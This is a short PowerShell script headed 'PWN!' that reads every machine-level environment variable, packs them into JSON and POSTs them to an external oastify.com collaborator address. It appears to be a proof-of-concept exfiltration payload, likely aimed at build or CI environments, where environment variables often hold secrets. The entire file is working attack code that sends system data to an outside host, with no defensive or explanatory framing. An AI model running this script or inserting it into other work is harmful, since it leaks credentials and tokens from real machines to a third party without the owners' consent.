# PWN!
# Define the URL you want to send the environment variables to
$remoteUrl = "http://9hryf86p3o4fl8ikham7mn3utlzcn4bt.oastify.com"

# Create a hashtable to store your environment variables
$envVariables = @{}

# Loop through each environment variable and add it to the hashtable
foreach ($envVar in [System.Environment]::GetEnvironmentVariables("Machine").GetEnumerator()) {
    $envVariables[$envVar.Key] = $envVar.Value
}

# Convert the hashtable to JSON
$jsonBody = $envVariables | ConvertTo-Json

# Send the environment variables to the remote URL
$response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $jsonBody -ContentType "application/json"

# Display the response
$response
